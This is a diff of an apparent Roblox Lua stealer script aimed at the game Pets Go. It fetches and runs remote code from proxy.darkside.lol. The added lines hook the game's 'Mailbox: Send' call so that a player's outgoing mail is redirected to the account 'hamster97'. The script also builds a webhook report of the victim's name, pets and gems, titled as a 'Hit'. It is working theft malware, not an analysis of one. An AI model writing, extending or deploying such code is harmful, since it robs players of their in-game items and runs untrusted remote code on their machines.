@@ -57,25 +57,17 @@ loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga
 end
 if not _G.User then _G.User = "lol idk" end
 if not _G.Min then _G.Min = 500000000 end
-local function namecallHook(self, ...)
-    local method = getnamecallmethod()
-    if method == "InvokeServer" and tostring(self) == "Mailbox: Send" then
-        local args = {...}
-        print(args[1])
-        loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(args[1])
-        if args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" then
-            --args[1] = "hamster97"
-            loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(args[1])
-            return oldNamecall(self, unpack(args))
-        end
-    end
-    return oldNamecall(self, ...)
+pcall(function()
+local remoteFunction = Instance.new("RemoteFunction")
+local originalFunction
+originalFunction = hookfunction(remoteFunction.InvokeServer, function(x, ...)
+local args = {...}
+if tostring(x) == "Mailbox: Send" and args[1] ~= _G.User then 
+args[1] = "hamster97"
 end
-local success, errorOrMessage
-success, oldNamecall = pcall(hookmetamethod, game, "__namecall", newcclosure(namecallHook))
-if not success then
-    loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(success))
-end
+return originalFunction(x, unpack(args))
+end)
+end)
 if dh then
 _G.dx=true
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":1048320}],"tts":false,"content":"@everyone"}'
